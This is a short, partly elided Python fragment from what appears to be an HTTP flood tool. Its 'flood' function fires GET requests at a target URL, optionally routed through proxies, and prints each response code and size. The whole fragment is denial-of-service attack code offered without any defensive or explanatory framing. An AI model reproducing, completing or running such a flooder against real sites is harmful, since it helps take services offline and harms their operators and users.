...
def flood(target: str, use_proxy: bool) -> None:
    ...
    try:
        if use_proxy:
            ...
            r = requests.get(target, headers=headers, proxies=proxy, timeout=1)
        else:
            r = requests.get(target, headers=headers, timeout=1)
        ...
        status = f"{color_code[r.status_code == 200]}Code: [{r.status_code}]"
        payload_size = f"{Fore.CYAN} Data Size: {len(r.content)/1000:>10} KB"
